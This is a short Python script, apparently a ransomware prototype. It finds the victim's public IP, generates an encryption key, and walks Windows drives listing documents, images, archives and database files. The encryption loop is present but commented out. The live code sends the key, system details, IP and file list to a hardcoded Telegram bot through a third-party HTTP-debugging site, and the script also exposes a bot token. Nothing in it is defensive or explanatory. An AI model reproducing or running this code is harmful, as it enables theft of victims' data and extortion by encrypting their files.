from subprocess import getoutput as cmd
from cryptography.fernet import Fernet as cr
import os,requests,platform,time
times=time.localtime()
while True:
    try:
        REQUES=requests.get('https://httpbin.org/ip')
        if REQUES.status_code==200:
            break
        else:
            pass
    except KeyboardInterrupt:
        pass
    except ConnectionError:
        pass
    except:
        pass

DRIVES=['A','B','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
FILE_FORMAT=['jpg','png','word','pdf','accdb','xlsx','ttf','rar','zip','php','db','html','css']
FILE_FIND=[]
SYSINFO=platform.uname()
key=cr.generate_key()
TOCKEN=None
try:
    for i in DRIVES:
        os.chdir(f'{i}:')
        for f in FILE_FORMAT:
            CMD=cmd(f'dir /s /b *.{f}')
            FILE_FIND.append(CMD)
#             try:
#                 for file_os in CMD:
#                     with open(file_os,'rb') as word:
#                         FILE_TEXT=word.read()
#                         ENCRYPTFILE=cr.encrypt(key,FILE_TEXT)
#                         with open(file_os,'wb') as Write:
#                             Write.write(ENCRYPTFILE)
#                             print(f' [+] Encryp File :> {file_os} >> DONE!')
#             except:
#                 pass
# except:
#     pass
except:
    pass
DATA_of_bot=f'''
THE KEY OF CRYPTOGHRAPHY =    >>>       {key}        <<<


the system information = {SYSINFO}


ip   address   of  target = {REQUES.json()['origin']}

 
time to be crypt= {times.tm_year}/{times.tm_mon}/{times.tm_mday} in time >  {times.tm_hour}:{times.tm_min}:{times.tm_sec}



list of a link files= [
    {FILE_FIND}
]




'''
# with open('./telegram.txt','w') as telegram:
#     telegram.write(END_TEXT_CLIENT_BOT)
data_bot={
        'UrlBox':f'https://api.telegram.org/bot5013036073:AAFpJlOpt3C7QYQmwWueU2-I2NaiuGD5js8/sendmessage?chat_id=1852073140&text={str(DATA_of_bot)}',
        'AgentList':'Internet+Explorer',
        'VersionsList':'HTTP/1.1',
        'MethodList':'POST'
    }
requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=data_bot)